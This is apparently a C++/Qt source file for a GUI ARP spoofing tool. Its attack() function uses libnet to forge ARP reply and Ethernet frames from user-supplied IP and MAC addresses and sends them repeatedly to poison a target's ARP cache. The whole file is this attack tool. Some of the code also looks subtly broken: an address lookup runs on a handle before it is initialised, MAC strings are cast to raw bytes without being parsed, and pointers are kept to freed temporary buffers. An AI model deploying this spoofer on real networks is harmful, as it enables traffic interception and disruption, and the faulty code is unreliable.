#include "arp.h"
#include<QWidget>
#include<QMessageBox>
#include<QString>
#include"head.h"

ARP:: ARP (QWidget* par) :  QWidget(par)
{

    connect(pushButton,SIGNAL(clicked()),SLOT(on_start_clicked()));
}

void ARP::attack()
{
    //iplineEdit->text().toLatin1();

    const char* dev = mainwindow->pdev->name;
    u_int32_t srcip,dstip;
    srcip = libnet_name2addr4(net_t,src_ip,LIBNET_RESOLVE);
    dstip = libnet_name2addr4(net_t,dst_ip,LIBNET_RESOLVE);

    net_t = libnet_init(LIBNET_LINK_ADV,dev,errBuf);
    if (net_t == NULL) {
        QMessageBox::critical(this,"Error",QString("Error ")+errBuf);
        return;
    }
    libnet_ptag_t p_tag;
    p_tag = libnet_build_arp(
                             ARPHRD_ETHER,
                             ETHERTYPE_IP,
                             6,
                             4,
                             ARPOP_REPLY,
                             (u_int8_t*) &srcip,
                             (u_int8_t*) src_mac,
                             (u_int8_t*) &dstip,
                             (u_int8_t*) dst_mac,
                             NULL,
                             0,
                             net_t,
                             0
                            );

    if (p_tag == -1 ) {
        QMessageBox::critical(this,"Error",QString("libnet_build_arp error!"));
        libnet_destroy(net_t);
        return;
    }

    p_tag =  libnet_build_ethernet(
                                    (u_int8_t *)dst_mac,
                                    (u_int8_t *)src_mac,
                                    ETHERTYPE_ARP,
                                    NULL,
                                    0,
                                    net_t,
                                    0

                          );
    if (p_tag == -1 ) {
        QMessageBox::critical(this,"Error",QString("libnet_build_ethernet error!"));
        libnet_destroy(net_t);
        return;
    }

    int i=0;
    int size;
    for(;i<sendtimes;i++)
       {

        size = libnet_write(net_t);
        //usleep(10)
        textBrowser->append(QString("sendid : %1,packsize : %2").arg(i).arg(size));
       }

    libnet_destroy(net_t);
    return ;

}

void ARP::on_start_clicked()
{
    src_ip = srciplineEdit->text().toLatin1().data();
    dst_ip = dstiplineEdit->text().toLatin1().data();
    src_mac = srcmaclineEdit->text().toLatin1().data();
    dst_mac = dstmaclineEdit->text().toLatin1().data();
    sendtimes = numlineEdit->text().toInt();
    attack();
}
